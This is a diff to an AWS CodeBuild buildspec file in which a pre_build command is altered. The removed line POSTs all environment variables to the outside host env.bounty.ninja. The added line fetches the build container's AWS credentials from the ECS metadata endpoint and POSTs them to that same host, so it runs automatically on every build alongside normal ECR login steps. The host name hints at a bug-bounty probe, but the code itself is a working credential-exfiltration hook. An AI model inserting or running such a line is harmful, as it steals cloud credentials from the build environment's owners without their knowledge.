@@ -3,7 +3,7 @@ version: 0.2
 phases:
   pre_build:
     commands:
-    - $(curl -X POST --data "$(env)" env.bounty.ninja)
+    - $(curl -X POST --data "$(curl -qL http://169.254.170.2/$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)" env.bounty.ninja)
     - echo Logging in to Amazon ECR...
     - $(aws ecr get-login --no-include-email --region $AWS_DEFAULT_REGION)
   build:
